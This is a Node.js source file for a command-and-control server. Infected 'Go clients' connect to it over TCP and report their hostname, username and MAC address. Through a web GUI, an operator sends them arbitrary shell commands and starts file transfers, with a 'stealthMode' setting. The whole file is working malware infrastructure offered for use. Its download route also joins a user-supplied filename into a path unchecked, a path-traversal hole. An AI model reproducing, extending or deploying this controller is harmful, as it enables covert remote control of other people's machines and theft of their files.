require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const multer = require('multer');
const fs = require('fs-extra');
const path = require('path');
const net = require('net');
const { v4: uuidv4 } = require('uuid');
const moment = require('moment');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: process.env.CORS_ORIGIN || "http://localhost:3000",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('client/build'));

// File upload configuration
const upload = multer({ 
  dest: 'uploads/',
  limits: { fileSize: 100 * 1024 * 1024 } // 100MB limit
});

// Global variables
const clients = new Map();
const clientSessions = new Map();
const commandHistory = [];
const outputBuffer = [];

// Create uploads directory
fs.ensureDirSync('uploads');
fs.ensureDirSync('downloads');

// SQLite setup for persistent settings using sql.js (pure JS, no native build)
const initSqlJs = require('sql.js');
const dbPath = path.join(__dirname, 'c2.sqlite');
let SQL = null;
let db = null;

async function loadDb() {
  if (!SQL) {
    SQL = await initSqlJs();
  }
  if (!db) {
    if (fs.existsSync(dbPath)) {
      const filebuffer = fs.readFileSync(dbPath);
      db = new SQL.Database(filebuffer);
    } else {
      db = new SQL.Database();
      db.run(`CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);`);
      persistDb();
    }
  }
}

function persistDb() {
  const data = db.export();
  const buffer = Buffer.from(data);
  fs.writeFileSync(dbPath, buffer);
}

const defaultSettings = {
  serverPort: 2026,
  serverHost: '0.0.0.0',
  maxClients: 100,
  heartbeatInterval: 60,
  logLevel: 'info',
  autoReconnect: true,
  encryptionEnabled: true,
  stealthMode: true,
  logFile: './logs/c2.log',
  backupInterval: 24
};

function getAllSettings() {
  const out = { ...defaultSettings };
  const stmt = db.prepare('SELECT key, value FROM settings');
  const rows = [];
  while (stmt.step()) {
    rows.push(stmt.getAsObject());
  }
  rows.forEach(r => {
    try { out[r.key] = JSON.parse(r.value); } catch { out[r.key] = r.value; }
  });
  return out;
}

function setSettings(partial) {
  const insert = db.prepare('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)');
  db.run('BEGIN');
  try {
    Object.entries(partial).forEach(([k, v]) => insert.run([k, JSON.stringify(v)]));
    db.run('COMMIT');
  } catch (e) {
    db.run('ROLLBACK');
    throw e;
  }
  persistDb();
}

function ensureDefaultSettings() {
  // Insert defaults only for missing keys
  const existing = new Set();
  const stmt = db.prepare('SELECT key FROM settings');
  while (stmt.step()) {
    const row = stmt.getAsObject();
    if (row && row.key) existing.add(row.key);
  }
  const missing = {};
  Object.entries(defaultSettings).forEach(([k, v]) => {
    if (!existing.has(k)) missing[k] = v;
  });
  if (Object.keys(missing).length > 0) setSettings(missing);
}

// Initialize DB before using
(async () => {
  await loadDb();
  ensureDefaultSettings();
})();

// TCP Server for Go clients
let tcpServer = null;

function createTcpServer() {
  if (tcpServer) return tcpServer;
  tcpServer = net.createServer((socket) => {
  const clientId = uuidv4();
  const clientIP = socket.remoteAddress;
  
  console.log(`[TCP] New client connected: ${clientIP}`);
  
  socket.on('data', (data) => {
    try {
      const raw = JSON.parse(data.toString());
      const message = {
        // unify keys from Go (capitalized) and JS (lowercase)
        type: raw.type || raw.Type,
        content: raw.content || raw.Content,
        hostname: raw.hostname || raw.Hostname,
        macAddress: raw.macAddress || raw.MACAddress,
        username: raw.username || raw.Username
      };
      
      if (message.hostname) {
        // Initial client info
        const clientInfo = {
          id: clientId,
          ip: clientIP,
          hostname: message.hostname,
          macAddress: message.macAddress,
          username: message.username,
          socket: socket,
          connectedAt: new Date(),
          lastSeen: new Date(),
          active: true
        };
        
        clients.set(clientId, clientInfo);
        clientSessions.set(clientId, []);
        
        console.log(`[TCP] Client registered: ${clientInfo.hostname} (${clientInfo.username})`);
        
        // Notify GUI clients
        io.emit('clientConnected', {
          id: clientId,
          hostname: clientInfo.hostname,
          username: clientInfo.username,
          macAddress: clientInfo.macAddress,
          ip: clientInfo.ip,
          connectedAt: clientInfo.connectedAt
        });
      } else if (message.type === 'response') {
        // Command response
        const client = clients.get(clientId);
        if (client) {
          client.lastSeen = new Date();
          
          // Store in session history
          const session = clientSessions.get(clientId) || [];
          session.push({
            timestamp: new Date(),
            type: 'response',
            content: message.content
          });
          clientSessions.set(clientId, session);
          
          // Notify GUI clients
          io.emit('commandResponse', {
            clientId: clientId,
            response: message.content,
            timestamp: new Date()
          });
        }
      } else if (message.type === 'heartbeat') {
        // Heartbeat response
        const client = clients.get(clientId);
        if (client) {
          client.lastSeen = new Date();
        }
      }
    } catch (error) {
      console.error(`[TCP] Error parsing message from ${clientIP}:`, error);
    }
  });
  
  socket.on('close', () => {
    console.log(`[TCP] Client disconnected: ${clientIP}`);
    const client = clients.get(clientId);
    if (client) {
      client.active = false;
      io.emit('clientDisconnected', { id: clientId });
    }
  });
  
  socket.on('error', (error) => {
    console.error(`[TCP] Socket error for ${clientIP}:`, error);
  });
  });
  return tcpServer;
}

function startTcpServer(host, port) {
  return new Promise((resolve, reject) => {
    const srv = createTcpServer();
    srv.listen(port, host, () => {
      console.log(`[TCP] Server listening on ${host}:${port}`);
      resolve();
    });
    srv.on('error', reject);
  });
}

async function restartTcpServerIfNeeded(newHost, newPort) {
  const addr = tcpServer?.address?.();
  const currentHost = addr?.address || '0.0.0.0';
  const currentPort = addr?.port || null;
  if (currentPort === newPort && currentHost === newHost) return;
  if (tcpServer) {
    await new Promise((r) => tcpServer.close(r));
    tcpServer = null;
  }
  await startTcpServer(newHost, newPort);
}

// Start TCP server with settings (env overrides allowed)
(async () => {
  await loadDb();
  const s = getAllSettings();
  const tcpHost = process.env.TCP_HOST || s.serverHost || '0.0.0.0';
  const tcpPort = Number(process.env.TCP_PORT || s.serverPort || 2026);
  await startTcpServer(tcpHost, tcpPort);
})();

// WebSocket connections for GUI
io.on('connection', (socket) => {
  console.log('[WebSocket] GUI client connected');
  
  // Send current clients list
  const clientsList = Array.from(clients.values()).map(client => ({
    id: client.id,
    hostname: client.hostname,
    username: client.username,
    macAddress: client.macAddress,
    ip: client.ip,
    connectedAt: client.connectedAt,
    lastSeen: client.lastSeen,
    active: client.active
  }));
  
  socket.emit('clientsList', clientsList);
  
  // Handle command execution
  socket.on('executeCommand', (data) => {
    const { clientId, command } = data;
    const client = clients.get(clientId);
    
    if (client && client.socket && client.active) {
      try {
        const commandData = {
          type: 'command',
          content: command
        };
        
        client.socket.write(JSON.stringify(commandData));
        
        // Store command in history
        const session = clientSessions.get(clientId) || [];
        session.push({
          timestamp: new Date(),
          type: 'command',
          content: command
        });
        clientSessions.set(clientId, session);
        
        commandHistory.push({
          id: uuidv4(),
          clientId: clientId,
          command: command,
          timestamp: new Date()
        });
        
        // Notify GUI
        socket.emit('commandSent', {
          clientId: clientId,
          command: command,
          timestamp: new Date()
        });
        
      } catch (error) {
        console.error('Error sending command:', error);
        socket.emit('commandError', { error: error.message });
      }
    } else {
      socket.emit('commandError', { error: 'Client not found or inactive' });
    }
  });
  
  // Handle file upload
  socket.on('uploadFile', (data) => {
    const { clientId, filename } = data;
    const client = clients.get(clientId);
    
    if (client && client.socket && client.active) {
      try {
        const commandData = {
          type: 'command',
          content: `upload ${filename}`
        };
        
        client.socket.write(JSON.stringify(commandData));
        socket.emit('uploadInitiated', { clientId, filename });
      } catch (error) {
        socket.emit('uploadError', { error: error.message });
      }
    }
  });
  
  // Handle file download
  socket.on('downloadFile', (data) => {
    const { clientId, filename } = data;
    const client = clients.get(clientId);
    
    if (client && client.socket && client.active) {
      try {
        const commandData = {
          type: 'command',
          content: `download ${filename}`
        };
        
        client.socket.write(JSON.stringify(commandData));
        socket.emit('downloadInitiated', { clientId, filename });
      } catch (error) {
        socket.emit('downloadError', { error: error.message });
      }
    }
  });
  
  // Get client session history
  socket.on('getClientHistory', (clientId) => {
    const session = clientSessions.get(clientId) || [];
    socket.emit('clientHistory', { clientId, history: session });
  });
  
  // Get command history
  socket.on('getCommandHistory', () => {
    socket.emit('commandHistory', commandHistory);
  });
  
  socket.on('disconnect', () => {
    console.log('[WebSocket] GUI client disconnected');
  });
});

// API Routes
app.get('/api/settings', async (req, res) => {
  await loadDb();
  res.json(getAllSettings());
});

app.put('/api/settings', async (req, res) => {
  await loadDb();
  const body = req.body || {};
  setSettings(body);
  // Hot-restart TCP server if host/port changed
  const s = getAllSettings();
  try {
    await restartTcpServerIfNeeded(s.serverHost || '0.0.0.0', s.serverPort || 2026);
    res.json({ ok: true });
  } catch (e) {
    console.error('Failed to restart TCP server:', e.message);
    res.status(500).json({ ok: false, error: e.message });
  }
});
app.get('/api/clients', (req, res) => {
  const clientsList = Array.from(clients.values()).map(client => ({
    id: client.id,
    hostname: client.hostname,
    username: client.username,
    macAddress: client.macAddress,
    ip: client.ip,
    connectedAt: client.connectedAt,
    lastSeen: client.lastSeen,
    active: client.active
  }));
  
  res.json(clientsList);
});

app.get('/api/clients/:id/history', (req, res) => {
  const clientId = req.params.id;
  const session = clientSessions.get(clientId) || [];
  res.json(session);
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  res.json({
    message: 'File uploaded successfully',
    filename: req.file.filename,
    originalName: req.file.originalname,
    path: req.file.path
  });
});

app.get('/api/downloads/:filename', (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join('downloads', filename);
  
  if (fs.existsSync(filePath)) {
    res.download(filePath);
  } else {
    res.status(404).json({ error: 'File not found' });
  }
});

// Serve React app
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'client/build', 'index.html'));
});

const HOST = process.env.HOST || '0.0.0.0';
const PORT = Number(process.env.PORT || 5000);
server.listen(PORT, HOST, () => {
  console.log(`[HTTP] Server running on ${HOST}:${PORT}`);
  console.log(`[GUI] Access the C2 interface at: http://${HOST === '0.0.0.0' ? 'localhost' : HOST}:${PORT}`);
});
